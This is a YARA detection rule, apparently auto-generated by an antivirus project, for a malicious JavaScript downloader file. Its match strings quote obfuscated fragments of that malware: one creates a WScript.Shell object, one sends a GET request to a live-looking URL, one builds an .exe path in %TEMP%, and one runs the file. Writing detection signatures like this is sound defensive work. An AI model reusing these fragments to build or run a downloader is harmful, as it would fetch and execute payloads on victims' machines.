rule sig_20160401_245ac3a33c711358d57f93b0f9850312 {
  meta:
    description = "datamaliciousorder - file 20160401_245ac3a33c711358d57f93b0f9850312.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ec08977033c0cf064d436d7965a52d7e613695dfbe3cb752c6a47f71e297b2be"

  strings:
    $s1  = "function WuFiq(ShWx, SjPad){HmKw = HmKw * 1; return ShWx - SjPad;};" fullword ascii
    $s2  = "var IzAaa = function SbiSij() {return WScript[HhjUq](\"WScript\"+\".Shell\");}(), NaVt = 11;" fullword ascii
    $s3  = "if (QfBox[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "QfBox[RzNzb](\"G\" + \"ET\", \"http://toysnet.nl/f9sla\", false);" fullword ascii
    $s5  = "function VsMqo() {return IzAaa[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"f1qDeQQKeA.ex\" + \"e\";};" fullword ascii
    $s6  = "function XkTno(){return DlDjr + \"\";};" fullword ascii
    $s7  = "function ZqGgk() {return ((KeGg == true) && (KeGg == GqIo)) ? 1 : HmKw;};" fullword ascii
    $s8  = "var FlTz = new this[\"Date\"]();" fullword ascii
    $s9  = "var GqIo = false;" fullword ascii
    $s10 = "function WvNq(FeMut) {var BqrLxc = (1, 2, 3, 4, 5, FeMut); return BqrLxc;};" fullword ascii
    $s11 = "function YikGk(){return 23;};" fullword ascii
    $s12 = "GqIo = true; " fullword ascii
    $s13 = "KeGg = true; " fullword ascii
    $s14 = "var DvwDyu = false;" fullword ascii
    $s15 = "return WuFiq(EgmDrm, PbQq);" fullword ascii
    $s16 = "function XzJck(AvOt){IzAaa[\"R\"+\"un\"](AvOt, HmKw, HmKw);};" fullword ascii
    $s17 = "}while (TzSl);" fullword ascii
    $s18 = "function OeeYm()" fullword ascii
    $s19 = "function AmeWrp(){return HhjUq;};" fullword ascii
    $s20 = "var KeGg = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}